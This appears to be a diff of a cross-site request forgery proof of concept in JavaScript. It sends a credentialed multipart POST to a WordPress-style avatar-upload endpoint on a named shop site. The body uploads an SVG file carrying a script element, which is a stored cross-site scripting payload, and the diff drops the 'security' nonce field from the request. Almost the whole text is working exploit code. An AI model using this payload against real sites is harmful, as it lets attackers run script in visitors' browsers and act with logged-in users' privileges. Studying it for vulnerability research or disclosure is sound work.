@@ -8,13 +8,10 @@
         xhr.open("POST", "https:\/\/ranginkaman.shop\/?ums-ajax=ums_save_user_avatar", true);
         xhr.setRequestHeader("accept", "application\/json, text\/javascript, *\/*; q=0.01");
         xhr.setRequestHeader("accept-language", "en-US,en;q=0.5");
-        xhr.setRequestHeader("content-type", "multipart\/form-data; boundary=---------------------------247286023415415376781463256100");
+        xhr.setRequestHeader("content-type", "multipart\/form-data; boundary=---------------------------286398348834692540014232660678");
         xhr.withCredentials = true;
-        var body = "-----------------------------247286023415415376781463256100\r\n" + 
-          "Content-Disposition: form-data; name=\"security\"\r\n" + 
-          "\r\n" + 
-          "8a57fef6aa\r\n" + 
-          "-----------------------------247286023415415376781463256100\r\n" + 
+        var body = "\r\n" + 
+          "-----------------------------286398348834692540014232660678\r\n" + 
           "Content-Disposition: form-data; name=\"file\"; filename=\"Storde-webhook.svg\"\r\n" + 
           "Content-Type: image/svg+xml\r\n" + 
           "\r\n" + 
@@ -40,7 +37,7 @@
           "  \x3c/script\x3e\r\n" + 
           "\x3c/svg\x3e\r\n" + 
           "\r\n" + 
-          "-----------------------------247286023415415376781463256100--\r\n";
+          "-----------------------------286398348834692540014232660678--\r\n";
         var aBody = new Uint8Array(body.length);
         for (var i = 0; i < aBody.length; i++)
           aBody[i] = body.charCodeAt(i); 
